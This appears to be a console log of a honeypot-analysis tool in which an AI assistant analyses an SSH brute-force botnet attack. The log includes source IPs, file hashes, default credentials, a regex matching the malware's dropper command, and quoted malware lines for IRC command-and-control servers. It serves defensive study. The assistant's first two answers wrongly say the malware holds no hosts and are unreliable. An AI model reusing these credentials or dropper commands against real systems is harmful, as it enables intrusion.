Status: in_progress Thread id: thread_jvn8wwUTULdr6Oczn7NhtRXc, run_id: run_7U7WKxhSvv1KxNTAcIDIulx5
Waiting 5 seconds for response
Status: in_progress Thread id: thread_jvn8wwUTULdr6Oczn7NhtRXc, run_id: run_7U7WKxhSvv1KxNTAcIDIulx5
Waiting 5 seconds for response
Status: completed Thread id: thread_jvn8wwUTULdr6Oczn7NhtRXc, run_id: run_7U7WKxhSvv1KxNTAcIDIulx5
Run run_7U7WKxhSvv1KxNTAcIDIulx5 completed
Done asst_yJ9SbR6g98zbMTwfXQHmvrcH, thread_jvn8wwUTULdr6Oczn7NhtRXc, run_7U7WKxhSvv1KxNTAcIDIulx5

 Done with: What is the goal of the attack?
Answer: The goal of the attack on the Linux honeypot appears to be multifaceted, involving several objectives:

1. **Unauthorized Access and Control:**
   - Gain initial access to a system using default or weak SSH credentials. This enables the attacker to execute commands and deploy malware for control over the compromised system.

2. **Persistence and Privilege Escalation:**
   - Establish persistence by adding the malware to startup routines and elevating privileges to maintain long-term access. This suggests intent to secure control over the system across reboots and potential system administration activities.

3. **Malware Deployment:**
   - Install and execute malware to perform unauthorized actions, such as joining a botnet for coordinated activities or performing further malicious operations.

4. **Propagation and Expansion of Attack Surface:**
   - Use the compromised system as a launchpad for scanning and infecting other vulnerable systems on the internet, effectively expanding the botnet or the network of compromised hosts.

5. **Botnet Participation:**
   - Connect to an IRC server and wait for commands, indicating the infected system was part of a botnet, which could be leveraged for various coordinated attacks such as DDoS attacks, spreading spam, or further malware distribution.

6. **Credential Theft and Lateral Movement:**
   - Change the password of the user `pi` to maintain unauthorized access and potentially move laterally across the network by compromising more systems.

7. **Resource Hijacking:**
   - Kill processes related to other malicious activities, suggesting the attacker's intent to free up system resources potentially for cryptocurrency mining or to ensure their malware remains the predominant unauthorized software on the compromised system.

8. **Data Destruction and Defense Evasion:**
   - Modify system files (`/etc/hosts`, `.bashrc`, etc.) and network settings (DNS configuration) to hide their activity and potentially disrupt the normal operation of system utilities and security software.

Overall, the attack exhibits the characteristics of seeking to achieve ongoing unauthorized access, exploit system resources, conduct malicious cyber activities, and potentially perform financial theft or sabotage. The deployment of a botnet functionality also hints at collective capabilities for larger scale nefarious activities orchestrated by the attacker.


Asking: If the system is vulnerable, would the attack will be successful?
Updated asst_yJ9SbR6g98zbMTwfXQHmvrcH: instructions, tools
Status: queued Thread id: thread_jvn8wwUTULdr6Oczn7NhtRXc, run_id: run_GOXMWyYyuIhfTDpp4FJlnbSU
Waiting 5 seconds for response
Status: in_progress Thread id: thread_jvn8wwUTULdr6Oczn7NhtRXc, run_id: run_GOXMWyYyuIhfTDpp4FJlnbSU
Waiting 5 seconds for response
Status: in_progress Thread id: thread_jvn8wwUTULdr6Oczn7NhtRXc, run_id: run_GOXMWyYyuIhfTDpp4FJlnbSU
Waiting 5 seconds for response
Status: in_progress Thread id: thread_jvn8wwUTULdr6Oczn7NhtRXc, run_id: run_GOXMWyYyuIhfTDpp4FJlnbSU
Waiting 5 seconds for response
Status: in_progress Thread id: thread_jvn8wwUTULdr6Oczn7NhtRXc, run_id: run_GOXMWyYyuIhfTDpp4FJlnbSU
Waiting 5 seconds for response
Status: in_progress Thread id: thread_jvn8wwUTULdr6Oczn7NhtRXc, run_id: run_GOXMWyYyuIhfTDpp4FJlnbSU
Waiting 5 seconds for response
Status: in_progress Thread id: thread_jvn8wwUTULdr6Oczn7NhtRXc, run_id: run_GOXMWyYyuIhfTDpp4FJlnbSU
Waiting 5 seconds for response
Status: completed Thread id: thread_jvn8wwUTULdr6Oczn7NhtRXc, run_id: run_GOXMWyYyuIhfTDpp4FJlnbSU
Run run_GOXMWyYyuIhfTDpp4FJlnbSU completed
Done asst_yJ9SbR6g98zbMTwfXQHmvrcH, thread_jvn8wwUTULdr6Oczn7NhtRXc, run_GOXMWyYyuIhfTDpp4FJlnbSU

 Done with: If the system is vulnerable, would the attack will be successful?
Answer: Based on the details of the attack, its success largely depends on the exploitation of weak security practices rather than specific software vulnerabilities. The key factors that could have made the system vulnerable, and thereby susceptible to a successful attack, include:

1. **Default or Weak Credentials:** If the system was using default usernames and passwords (such as `pi:raspberry`), the attacker's brute force or credential stuffing attempts would likely succeed, granting them initial access.

2. **Lack of Proper User Permission Configurations:** If users are improperly configured to have more privileges than necessary, especially the ability to execute commands via `sudo` without authentication, attackers can easily escalate their privileges.

3. **Inadequate Security Monitoring and Response:** Without security monitoring solutions that detect and respond to unusual activity (such as multiple failed login attempts or the sudden addition of SSH keys), the attack could proceed unnoticed.

4. **Exposure to Internet:** If services like SSH are unnecessarily exposed to the internet, especially with weak credentials, the risk of a successful attack increases significantly.

5. **Insufficient Host-based Security Controls:** Lacking firewalls, access controls, and file integrity monitoring can leave a system exposed to changes in critical files like `.bashrc` or `/etc/rc.local`, which attackers can exploit to establish persistence.

6. **Failure to Isolate and Segment Networks:** If the system is directly accessible from the internet without being segmented or isolated within a network, it's easier for attackers to move laterally after compromising the system.

7. **Unrestricted Outbound Connections:** If the network allows unrestricted outbound connections, it can be used by the malware to connect to external command and control servers, as seen with the IRC server connection.

In the absence of these vulnerabilities, the system's security measures would likely prevent at least some stages of the attack from being successful. For example, strong, unique credentials would prevent initial SSH access, proper user privilege configurations would stop unauthorized `sudo` actions, and active monitoring would detect and potentially stop malicious activities.

Even if a system has technical vulnerabilities, it may not fall victim to an attack if it has robust security policies and practices in place. This includes regular security audits, the principle of least privilege for user accounts, network segmentation, use of intrusion detection and prevention systems (IDS/IPS), timely patch management, and comprehensive monitoring and response strategies.


Asking: How can a system be protected from this attack?
Updated asst_yJ9SbR6g98zbMTwfXQHmvrcH: instructions, tools
Status: in_progress Thread id: thread_jvn8wwUTULdr6Oczn7NhtRXc, run_id: run_fo1SCjRSHqu8Vh2bC8mQMQkR
Waiting 5 seconds for response
Status: in_progress Thread id: thread_jvn8wwUTULdr6Oczn7NhtRXc, run_id: run_fo1SCjRSHqu8Vh2bC8mQMQkR
Waiting 5 seconds for response
Status: in_progress Thread id: thread_jvn8wwUTULdr6Oczn7NhtRXc, run_id: run_fo1SCjRSHqu8Vh2bC8mQMQkR
Waiting 5 seconds for response
Status: in_progress Thread id: thread_jvn8wwUTULdr6Oczn7NhtRXc, run_id: run_fo1SCjRSHqu8Vh2bC8mQMQkR
Waiting 5 seconds for response
Status: in_progress Thread id: thread_jvn8wwUTULdr6Oczn7NhtRXc, run_id: run_fo1SCjRSHqu8Vh2bC8mQMQkR
Waiting 5 seconds for response
Status: in_progress Thread id: thread_jvn8wwUTULdr6Oczn7NhtRXc, run_id: run_fo1SCjRSHqu8Vh2bC8mQMQkR
Waiting 5 seconds for response
Status: in_progress Thread id: thread_jvn8wwUTULdr6Oczn7NhtRXc, run_id: run_fo1SCjRSHqu8Vh2bC8mQMQkR
Waiting 5 seconds for response
Status: completed Thread id: thread_jvn8wwUTULdr6Oczn7NhtRXc, run_id: run_fo1SCjRSHqu8Vh2bC8mQMQkR
Run run_fo1SCjRSHqu8Vh2bC8mQMQkR completed
Done asst_yJ9SbR6g98zbMTwfXQHmvrcH, thread_jvn8wwUTULdr6Oczn7NhtRXc, run_fo1SCjRSHqu8Vh2bC8mQMQkR

 Done with: How can a system be protected from this attack?
Answer: To protect a system from this type of attack, multiple security measures should be implemented, focusing on prevention, detection, and response. Here are some ways to safeguard a system:

1. **Use Strong, Unique Credentials:**
   - Implement strong password policies and avoid using default credentials.
   - Regularly rotate passwords and encourage the use of password managers.

2. **Implement Two-Factor Authentication (2FA):**
   - Enable 2FA wherever possible to add an extra layer of security on top of passwords.

3. **Privilege Management:**
   - Practice the principle of least privilege, ensuring users have only the necessary access rights.
   - Restrict `sudo` privileges and monitor `sudoers` file changes.

4. **Regularly Update and Patch Systems:**
   - Keep all system software up to date with the latest security patches to mitigate known vulnerabilities.

5. **Harden SSH Configuration:**
   - Disable root login over SSH.
   - Use SSH keys for authentication rather than passwords, if possible.
   - Limit SSH access to known IP addresses through firewall rules or SSH configuration.

6. **Network Security:**
   - Use firewalls to block unnecessary inbound and outbound connections.
   - Implement network segmentation to isolate critical systems and limit lateral movement.
   - Monitor network traffic for abnormal patterns that could indicate an attack.

7. **Host-Based Security Measures:**
   - Install and configure intrusion detection systems (IDS) and intrusion prevention systems (IPS).
   - Use security software to monitor for and quarantine suspicious files.
   - Regularly scan systems for malware and vulnerabilities.

8. **File Integrity Monitoring:**
   - Implement tools to monitor critical system files for unauthorized changes.

9. **User Activity Monitoring:**
   - Monitor and alert on suspicious user activities, such as multiple failed login attempts or unexpected privilege escalations.

10. **Backup and Disaster Recovery:**
    - Maintain regular and secure backups of critical data.
    - Develop and test a disaster recovery plan to ensure business continuity in case of a successful breach.

11. **Security Training and Awareness:**
    - Provide regular security training to all users, focusing on recognizing and reporting phishing attempts, malware, and other security threats.

12. **Incident Response Plan:**
    - Establish and periodically test an incident response plan to quickly and effectively handle potential security breaches.

Implementing these measures can significantly reduce the risk of a successful attack, both from the specific techniques used in this scenario and from a broad range of other potential vulnerabilities and threat actors.


Asking: What are the indicators of compromise (IOCs) for this attack?
Updated asst_yJ9SbR6g98zbMTwfXQHmvrcH: instructions, tools
Status: queued Thread id: thread_jvn8wwUTULdr6Oczn7NhtRXc, run_id: run_r2ndvw9w3hJlFjfzHplDT78a
Waiting 5 seconds for response
Status: in_progress Thread id: thread_jvn8wwUTULdr6Oczn7NhtRXc, run_id: run_r2ndvw9w3hJlFjfzHplDT78a
Waiting 5 seconds for response
Status: in_progress Thread id: thread_jvn8wwUTULdr6Oczn7NhtRXc, run_id: run_r2ndvw9w3hJlFjfzHplDT78a
Waiting 5 seconds for response
Status: in_progress Thread id: thread_jvn8wwUTULdr6Oczn7NhtRXc, run_id: run_r2ndvw9w3hJlFjfzHplDT78a
Waiting 5 seconds for response
Status: in_progress Thread id: thread_jvn8wwUTULdr6Oczn7NhtRXc, run_id: run_r2ndvw9w3hJlFjfzHplDT78a
Waiting 5 seconds for response
Status: completed Thread id: thread_jvn8wwUTULdr6Oczn7NhtRXc, run_id: run_r2ndvw9w3hJlFjfzHplDT78a
Run run_r2ndvw9w3hJlFjfzHplDT78a completed
Done asst_yJ9SbR6g98zbMTwfXQHmvrcH, thread_jvn8wwUTULdr6Oczn7NhtRXc, run_r2ndvw9w3hJlFjfzHplDT78a

 Done with: What are the indicators of compromise (IOCs) for this attack?
Answer: Indicators of Compromise (IOCs) are forensic data that help identify potentially malicious activity on a system or network. For the attack described, the following IOCs can be considered:

1. **Source IP Addresses:**
   - 93.223.169.159
   - 27.93.25.111
   - 111.216.194.148

2. **Malicious File Hashes:**
   - 10f8f2573cbb3954d3c0908af9e53daca56ab6db7c5239f92c7cf917549dea6c
   - 1b82ac2aca7cd9b3b1d352dbb024a1ae736579e23860b353be95f5e19d160d51
   - b9e33cd433b4c78c80e6233e829f5b57b64940e83ea8733978300becc3f5a23f

3. **Suspicious Files and Filepaths:**
   - /tmp/BUwTrLEj (or other randomly named files in /tmp)
   - Any files added to /opt/ with unusual names
   - Changes or additions to /root/.ssh/authorized_keys

4. **Malware Artifacts:**
   - The presence of bash scripts similar to the one described in the malware analysis that includes persistence mechanisms, botnet activity, and self-propagation code.

5. **Suspicious System Changes:**
   - Modifications to `/etc/rc.local` file.
   - Unexplained reboots of the system.
   - Removal or alteration of `/root/.bashrc` and `/home/pi/.bashrc`.
   - Unauthorized changes to the `pi` user's password or other accounts.

6. **Unexpected Network Traffic:**
   - Outgoing connections to unusual IRC servers.
   - Large volumes of outgoing SSH traffic especially using common usernames and passwords.
   - Network scanning traffic originating from the infected system, particularly on port 22 (SSH).

7. **Command and Control Activity:**
   - Traffic patterns indicating communication with a command and control server, especially if using IRC protocols.

8. **Compromised Process Behavior:**
   - Processes that are terminating other processes en masse, particularly those named with keywords included in the malware payload (e.g., minerd, kaiten).

These IOCs can be used for active monitoring and for conducting retrospective incident analysis to identify if a system has been compromised by this specific attack or something similar. It is important to integrate these IOCs into intrusion detection systems, security information and event management (SIEM) systems, and endpoint protection platforms to help in the early detection of a breach.


Asking: Summarize attack details, methods and goals to begin the report.
Updated asst_yJ9SbR6g98zbMTwfXQHmvrcH: instructions, tools
Status: in_progress Thread id: thread_jvn8wwUTULdr6Oczn7NhtRXc, run_id: run_K5a1KEqn7qm4V4a1lXjVeJOu
Waiting 5 seconds for response
Status: in_progress Thread id: thread_jvn8wwUTULdr6Oczn7NhtRXc, run_id: run_K5a1KEqn7qm4V4a1lXjVeJOu
Waiting 5 seconds for response
Status: in_progress Thread id: thread_jvn8wwUTULdr6Oczn7NhtRXc, run_id: run_K5a1KEqn7qm4V4a1lXjVeJOu
Waiting 5 seconds for response
Status: in_progress Thread id: thread_jvn8wwUTULdr6Oczn7NhtRXc, run_id: run_K5a1KEqn7qm4V4a1lXjVeJOu
Waiting 5 seconds for response
Status: in_progress Thread id: thread_jvn8wwUTULdr6Oczn7NhtRXc, run_id: run_K5a1KEqn7qm4V4a1lXjVeJOu
Waiting 5 seconds for response
Status: in_progress Thread id: thread_jvn8wwUTULdr6Oczn7NhtRXc, run_id: run_K5a1KEqn7qm4V4a1lXjVeJOu
Waiting 5 seconds for response
Status: in_progress Thread id: thread_jvn8wwUTULdr6Oczn7NhtRXc, run_id: run_K5a1KEqn7qm4V4a1lXjVeJOu
Waiting 5 seconds for response
Status: in_progress Thread id: thread_jvn8wwUTULdr6Oczn7NhtRXc, run_id: run_K5a1KEqn7qm4V4a1lXjVeJOu
Waiting 5 seconds for response
Status: in_progress Thread id: thread_jvn8wwUTULdr6Oczn7NhtRXc, run_id: run_K5a1KEqn7qm4V4a1lXjVeJOu
Waiting 5 seconds for response
Status: in_progress Thread id: thread_jvn8wwUTULdr6Oczn7NhtRXc, run_id: run_K5a1KEqn7qm4V4a1lXjVeJOu
Waiting 5 seconds for response
Status: completed Thread id: thread_jvn8wwUTULdr6Oczn7NhtRXc, run_id: run_K5a1KEqn7qm4V4a1lXjVeJOu
Run run_K5a1KEqn7qm4V4a1lXjVeJOu completed
Done asst_yJ9SbR6g98zbMTwfXQHmvrcH, thread_jvn8wwUTULdr6Oczn7NhtRXc, run_K5a1KEqn7qm4V4a1lXjVeJOu

 Done with: Summarize attack details, methods and goals to begin the report.
Answer: # Attack Summary Report

## Executive Summary
This report details a sophisticated attack targeting a Linux honeypot. The intrusion was primarily facilitated through the exploitation of default or weak SSH credentials, leading to unauthorized system access, the deployment of a multifunctional malware, and further attack propagation attempts.

## Attack Details
- **Source IPs:**
  - 93.223.169.159 (Germany)
  - 27.93.25.111 (Japan)
  - 111.216.194.148 (Japan)
  
- **Methods:**
  - Utilization of common, weak SSH credentials (`pi` with passwords `raspberry` and `raspberryraspberry993311`) to gain initial access.
  - Installation of a Linux trojan, persisting via `rc.local` modifications and setting up a reboot mechanism.
  - Deployment of an IRC bot to establish command and control (C2) communications.
  - Execution of lateral movement techniques by scanning for and attempting to exploit other systems on the internet via SSH.
  - Potential credential compromise by changing user passwords.
  - Execution of cleanup routines to terminate certain processes and remove competition or traces.

- **Goal:**
  - Establish and maintain unauthorized access to the host system.
  - Enlist the compromised system into a botnet for ongoing C2 activities.
  - Spread the infection to additional systems by exploiting weak SSH credentials.

## Conclusion
The attackers demonstrated a clear intent to gain control of systems for malicious purposes, including botnet activities and further network compromise. Such objectives reveal a threat actor that is not only interested in immediate gains but also in sustaining a presence within compromised systems for potential long-term exploitation. The observed methods and tactics emphasize the need for robust security measures and continuous monitoring to mitigate such threats.


Asking: Create an informative title for this attack based on the analysis that describes the attack methods, goals and source. Do not use any markdown.
Updated asst_yJ9SbR6g98zbMTwfXQHmvrcH: instructions, tools
Status: queued Thread id: thread_jvn8wwUTULdr6Oczn7NhtRXc, run_id: run_owDflzTezPWqntv5YWZnCtNI
Waiting 5 seconds for response
Status: completed Thread id: thread_jvn8wwUTULdr6Oczn7NhtRXc, run_id: run_owDflzTezPWqntv5YWZnCtNI
Run run_owDflzTezPWqntv5YWZnCtNI completed
Done asst_yJ9SbR6g98zbMTwfXQHmvrcH, thread_jvn8wwUTULdr6Oczn7NhtRXc, run_owDflzTezPWqntv5YWZnCtNI

 Done with: Create an informative title for this attack based on the analysis that describes the attack methods, goals and source. Do not use any markdown.
Answer: Compromised Honeypot via Default SSH Credentials Leads to Botnet Inclusion and Propagation_attempt by Attackers from Germany and Japan
Done analyzing/postprocessing 1 attacks.
Writing markdown report for attack 10f8f2573cbb3954d3c0908af9e53daca56ab6db7c5239f92c7cf917549dea6c to /Users/lucasfaudman/Documents/SANS/testenv/attacks/10f8f2573cbb3954d3c0908af9e53daca56ab6db7c5239f92c7cf917549dea6c/README.md
Finished writing markdown report and for attack 10f8f2573cbb3954d3c0908af9e53daca56ab6db7c5239f92c7cf917549dea6c to /Users/lucasfaudman/Documents/SANS/testenv/attacks/10f8f2573cbb3954d3c0908af9e53daca56ab6db7c5239f92c7cf917549dea6c/README.md
Writing markdown run steps for attack 10f8f2573cbb3954d3c0908af9e53daca56ab6db7c5239f92c7cf917549dea6c to /Users/lucasfaudman/Documents/SANS/testenv/attacks/10f8f2573cbb3954d3c0908af9e53daca56ab6db7c5239f92c7cf917549dea6c/run-steps.md
Finished writing markdown run steps for attack 10f8f2573cbb3954d3c0908af9e53daca56ab6db7c5239f92c7cf917549dea6c to /Users/lucasfaudman/Documents/SANS/testenv/attacks/10f8f2573cbb3954d3c0908af9e53daca56ab6db7c5239f92c7cf917549dea6c/run-steps.md
Exporting attack report and files for attack 10f8f2573cbb3954d3c0908af9e53daca56ab6db7c5239f92c7cf917549dea6c to /Users/lucasfaudman/Documents/SANS/testenv/reports
Finished exporting attack report and files for attack 10f8f2573cbb3954d3c0908af9e53daca56ab6db7c5239f92c7cf917549dea6c to /Users/lucasfaudman/Documents/SANS/testenv/reports
Honeypot AI Finished Successfully!    
    """,
    


    "chat_mode": """
lucasfaudman@Lucass-MacBook-Pro testenv % honeypot-ai/run.sh -lfa --only-attack 10f8f2573cbb3954d3c0908af9e53daca56ab6db7c5239f92c7cf917549dea6c --chat
Starting honeypot-ai...

Loading attacks from attacks directory at /Users/lucasfaudman/Documents/SANS/testenv/attacks
Loading Attack: 10f8f2573cbb3954d3c0908af9e53daca56ab6db7c5239f92c7cf917549dea6c
Processing Events from Parser 1 of 2: <loganalyzers.logparser.CowrieParser object at 0x10afccb90>
Processing Events from Parser 2 of 2: <loganalyzers.logparser.ZeekParser object at 0x10ba4b010>
Loaded Attack: 10f8f2573cbb3954d3c0908af9e53daca56ab6db7c5239f92c7cf917549dea6c
(3->3) - Removed 0 attacks with ips ['216.243.47.166', '172.31.5.68', '54.67.87.80']
Attempting merge 18: 1b82ac2aca7cd9b3b1d352dbb024a1ae736579e23860b353be95f5e19d160d51 <- b9e33cd433b4c78c80e6233e829f5b57b64940e83ea8733978300becc3f5a23f by malware_urls
Merged 0 attacks by out of 18 attempts (0.0000%) 
Merge Attacks Time: 0.0030s
(3->3) - Merged 0 attacks with shared attrs
Regex merged 1b82ac2aca7cd9b3b1d352dbb024a1ae736579e23860b353be95f5e19d160d51 into 10f8f2573cbb3954d3c0908af9e53daca56ab6db7c5239f92c7cf917549dea6c on commands: re.compile('cd /tmp && chmod \\+x [\\w\\d]+ && bash -c ./[\\w\\d]+')
Regex merged b9e33cd433b4c78c80e6233e829f5b57b64940e83ea8733978300becc3f5a23f into 10f8f2573cbb3954d3c0908af9e53daca56ab6db7c5239f92c7cf917549dea6c on commands: re.compile('cd /tmp && chmod \\+x [\\w\\d]+ && bash -c ./[\\w\\d]+')
(3->1) - Merged 2 attacks with shared sig regexes
Chatting about attack 10f8f2573cbb3954d3c0908af9e53daca56ab6db7c5239f92c7cf917549dea6c with OpenAI Assistant

Entering Chat Mode...
Ask the AI assistant custom questions about:
Attack (mhash: 10f8f2573cbb3954d3c0908af9e53daca56ab6db7c5239f92c7cf917549dea6c), SourceIPs: 3, Sessions: 9, SSH: 9, Commands: 3, Cmdlogs: 4, Malware: 3 

AI Interactive Chat
Attack (mhash: 10f8f2573cbb3954d3c0908af9e53daca56ab6db7c5239f92c7cf917549dea6c), SourceIPs: 3, Sessions: 9, SSH: 9, Commands: 3, Cmdlogs: 4, Malware: 3 

Current questions:
{}

Choices:
 a) Ask questions
 e) Enter a question
 u) Upload multiline question from file
 c) Clear questions
 m) Change OpenAI model. (Current model: gpt-4-1106-preview)
 p) Print attack attributes
 q) Quit and continue main

Enter choice (a, e, u, c, m, p OR q): e
Enter question: What do we know about the ips and urls found in the malware?  
Enter question key or leave empty to use 'question_1' : 

AI Interactive Chat
Attack (mhash: 10f8f2573cbb3954d3c0908af9e53daca56ab6db7c5239f92c7cf917549dea6c), SourceIPs: 3, Sessions: 9, SSH: 9, Commands: 3, Cmdlogs: 4, Malware: 3 

Current questions:
{'question_1': 'What do we know about the ips and urls found in the malware? '}

Choices:
 a) Ask questions
 e) Enter a question
 u) Upload multiline question from file
 c) Clear questions
 m) Change OpenAI model. (Current model: gpt-4-1106-preview)
 p) Print attack attributes
 q) Quit and continue main

Enter choice (a, e, u, c, m, p OR q): a


Asking: What do we know about the ips and urls found in the malware? 
Status: queued Thread id: thread_jvn8wwUTULdr6Oczn7NhtRXc, run_id: run_tmBMj3fwLVPNhob8tg0fOxpo
Waiting 5 seconds for response
Status: in_progress Thread id: thread_jvn8wwUTULdr6Oczn7NhtRXc, run_id: run_tmBMj3fwLVPNhob8tg0fOxpo
Waiting 5 seconds for response
Status: in_progress Thread id: thread_jvn8wwUTULdr6Oczn7NhtRXc, run_id: run_tmBMj3fwLVPNhob8tg0fOxpo
Waiting 5 seconds for response
Status: completed Thread id: thread_jvn8wwUTULdr6Oczn7NhtRXc, run_id: run_tmBMj3fwLVPNhob8tg0fOxpo
Run run_tmBMj3fwLVPNhob8tg0fOxpo completed
Done asst_yJ9SbR6g98zbMTwfXQHmvrcH, thread_jvn8wwUTULdr6Oczn7NhtRXc, run_tmBMj3fwLVPNhob8tg0fOxpo

 Done with: What do we know about the ips and urls found in the malware? 
Answer: Based on the analysis conducted earlier, here's what we know about the IPs and URLs found in the malware:

### Malware-Related IPs and URLs:
- No specific URLs were associated with the malware based on the analysed attributes.
- The malware was downloaded during sessions initiated from the following source IPs:
  - `93.223.169.159`
  - `27.93.25.111`
  - `111.216.194.148`
  
### Analysis of Malware-related IPs:
- The three source IPs have been linked to malicious activities across various OSINT sources. They were reported for suspicious behaviors such as SSH brute force attacks and potential involvement in coordinated botnet activities.
- There have been reports and listings on blocklists and threat intelligence feeds such as AbuseIPDB, Shodan, ISC, CyberGordon, and others, indicating a history of malicious conduct.
- The IPs are associated with internet service providers in Germany and Japan and exhibited patterns that suggest they are part of an attack infrastructure.

### The Absence of URLs in the Malware:
- The data obtained did not reveal any URLs embedded within the malware itself. Therefore, there are no indicators that would point towards a specific domain or web infrastructure used for command and control or further distribution of the malware.

In conclusion, while there is substantive data regarding the nature and potential origins of the attacking IP addresses, there is no information within the provided malware sample related to URLs, which might correspond to command and control servers, download sites for additional payloads, or other malicious online infrastructure.

AI Interactive Chat
Attack (mhash: 10f8f2573cbb3954d3c0908af9e53daca56ab6db7c5239f92c7cf917549dea6c), SourceIPs: 3, Sessions: 9, SSH: 9, Commands: 3, Cmdlogs: 4, Malware: 3 

Current questions:
{}

Choices:
 a) Ask questions
 e) Enter a question
 u) Upload multiline question from file
 c) Clear questions
 m) Change OpenAI model. (Current model: gpt-4-1106-preview)
 p) Print attack attributes
 q) Quit and continue main

Enter choice (a, e, u, c, m, p OR q): e
Enter question: What about hosts found in the malware source code? 
Enter question key or leave empty to use 'question_2' : 

AI Interactive Chat
Attack (mhash: 10f8f2573cbb3954d3c0908af9e53daca56ab6db7c5239f92c7cf917549dea6c), SourceIPs: 3, Sessions: 9, SSH: 9, Commands: 3, Cmdlogs: 4, Malware: 3 

Current questions:
{'question_2': 'What about hosts found in the malware source code?'}

Choices:
 a) Ask questions
 e) Enter a question
 u) Upload multiline question from file
 c) Clear questions
 m) Change OpenAI model. (Current model: gpt-4-1106-preview)
 p) Print attack attributes
 q) Quit and continue main

Enter choice (a, e, u, c, m, p OR q): a


Asking: What about hosts found in the malware source code?
Status: in_progress Thread id: thread_jvn8wwUTULdr6Oczn7NhtRXc, run_id: run_Z4eTFCkmcc4LPSM8Qg2j57eI
Waiting 5 seconds for response
Status: in_progress Thread id: thread_jvn8wwUTULdr6Oczn7NhtRXc, run_id: run_Z4eTFCkmcc4LPSM8Qg2j57eI
Waiting 5 seconds for response
Status: requires_action Thread id: thread_jvn8wwUTULdr6Oczn7NhtRXc, run_id: run_Z4eTFCkmcc4LPSM8Qg2j57eI

AI called tool: get_malware_attrs
with args: {'malware_id': '10f8f2573cbb3954d3c0908af9e53daca56ab6db7c5239f92c7cf917549dea6c', 'attrs': ['hosts']}

Submitting tool output: {'hosts': {}}
Status: queued Thread id: thread_jvn8wwUTULdr6Oczn7NhtRXc, run_id: run_Z4eTFCkmcc4LPSM8Qg2j57eI
Waiting 5 seconds for response
Status: in_progress Thread id: thread_jvn8wwUTULdr6Oczn7NhtRXc, run_id: run_Z4eTFCkmcc4LPSM8Qg2j57eI
Waiting 5 seconds for response
Status: completed Thread id: thread_jvn8wwUTULdr6Oczn7NhtRXc, run_id: run_Z4eTFCkmcc4LPSM8Qg2j57eI
Run run_Z4eTFCkmcc4LPSM8Qg2j57eI completed
Done asst_yJ9SbR6g98zbMTwfXQHmvrcH, thread_jvn8wwUTULdr6Oczn7NhtRXc, run_Z4eTFCkmcc4LPSM8Qg2j57eI

 Done with: What about hosts found in the malware source code?
Answer: The malware sample analyzed did not contain any embedded hosts within its source code. Therefore, there were no specific hostnames or domain names extracted from the malware that could provide additional context or leads on the network infrastructure used for command and control or further malware distribution. This lack of embedded hosts might suggest that the malware relies on other means to communicate with its operators or to spread, such as hard-coded IP addresses, external configuration files, or a decentralized approach like a peer-to-peer network.

AI Interactive Chat
Attack (mhash: 10f8f2573cbb3954d3c0908af9e53daca56ab6db7c5239f92c7cf917549dea6c), SourceIPs: 3, Sessions: 9, SSH: 9, Commands: 3, Cmdlogs: 4, Malware: 3 

Current questions:
{}

Choices:
 a) Ask questions
 e) Enter a question
 u) Upload multiline question from file
 c) Clear questions
 m) Change OpenAI model. (Current model: gpt-4-1106-preview)
 p) Print attack attributes
 q) Quit and continue main

Enter choice (a, e, u, c, m, p OR q): e
Enter question: look at the source code to be sure
Enter question key or leave empty to use 'question_3' : 

AI Interactive Chat
Attack (mhash: 10f8f2573cbb3954d3c0908af9e53daca56ab6db7c5239f92c7cf917549dea6c), SourceIPs: 3, Sessions: 9, SSH: 9, Commands: 3, Cmdlogs: 4, Malware: 3 

Current questions:
{'question_3': 'look at the source code to be sure'}

Choices:
 a) Ask questions
 e) Enter a question
 u) Upload multiline question from file
 c) Clear questions
 m) Change OpenAI model. (Current model: gpt-4-1106-preview)
 p) Print attack attributes
 q) Quit and continue main

Enter choice (a, e, u, c, m, p OR q): a


Asking: look at the source code to be sure
Status: in_progress Thread id: thread_jvn8wwUTULdr6Oczn7NhtRXc, run_id: run_b026ZYVrywAWc1QDEqs8XhlJ
Waiting 5 seconds for response
Status: in_progress Thread id: thread_jvn8wwUTULdr6Oczn7NhtRXc, run_id: run_b026ZYVrywAWc1QDEqs8XhlJ
Waiting 5 seconds for response
Status: in_progress Thread id: thread_jvn8wwUTULdr6Oczn7NhtRXc, run_id: run_b026ZYVrywAWc1QDEqs8XhlJ
Waiting 5 seconds for response
Status: in_progress Thread id: thread_jvn8wwUTULdr6Oczn7NhtRXc, run_id: run_b026ZYVrywAWc1QDEqs8XhlJ
Waiting 5 seconds for response
Status: in_progress Thread id: thread_jvn8wwUTULdr6Oczn7NhtRXc, run_id: run_b026ZYVrywAWc1QDEqs8XhlJ
Waiting 5 seconds for response
Status: in_progress Thread id: thread_jvn8wwUTULdr6Oczn7NhtRXc, run_id: run_b026ZYVrywAWc1QDEqs8XhlJ
Waiting 5 seconds for response
Status: completed Thread id: thread_jvn8wwUTULdr6Oczn7NhtRXc, run_id: run_b026ZYVrywAWc1QDEqs8XhlJ
Run run_b026ZYVrywAWc1QDEqs8XhlJ completed
Done asst_yJ9SbR6g98zbMTwfXQHmvrcH, thread_jvn8wwUTULdr6Oczn7NhtRXc, run_b026ZYVrywAWc1QDEqs8XhlJ

 Done with: look at the source code to be sure
Answer: Certainly! Let's take a closer look at the text from the malware source code to examine if there are any hosts or domain names present.

From the earlier provided snippet of the malware source code, I noticed that there were entries related to modifying the `/etc/hosts` file and several hardcoded server addresses within an IRC botnet setup. The specific line from the source code is as follows:

```bash
echo "127.0.0.1 bins.deutschland-zahlung.eu" >> /etc/hosts
```

- The domain `bins.deutschland-zahlung.eu` was being redirected to the localhost address (`127.0.0.1`), which is often a technique used to block the domain by preventing the system from reaching the actual host associated with it.

As for the IRC servers, the malware code includes an array of hardcoded IRC server addresses which were part of a botnet functionality:

```bash
    arr[0]="ix1.undernet.org"
    arr[1]="ix2.undernet.org"
    arr[2]="Ashburn.Va.Us.UnderNet.org"
    arr[3]="Bucharest.RO.EU.Undernet.Org"
    arr[4]="Budapest.HU.EU.UnderNet.org"
    arr[5]="Chicago.IL.US.Undernet.org"
```

These entries are used by the botnet component of the malware to connect to these servers for command and control communication. The inclusion of multiple server addresses likely serves as a redundancy mechanism to maintain connectivity to the C2 infrastructure even if one or more servers are unavailable.

Both the redirection of the domain `bins.deutschland-zahlung.eu` to the loopback address and the hardcoded Undernet IRC server hostnames are critical in understanding the behavior and potential infrastructure of the malware.

AI Interactive Chat
Attack (mhash: 10f8f2573cbb3954d3c0908af9e53daca56ab6db7c5239f92c7cf917549dea6c), SourceIPs: 3, Sessions: 9, SSH: 9, Commands: 3, Cmdlogs: 4, Malware: 3 

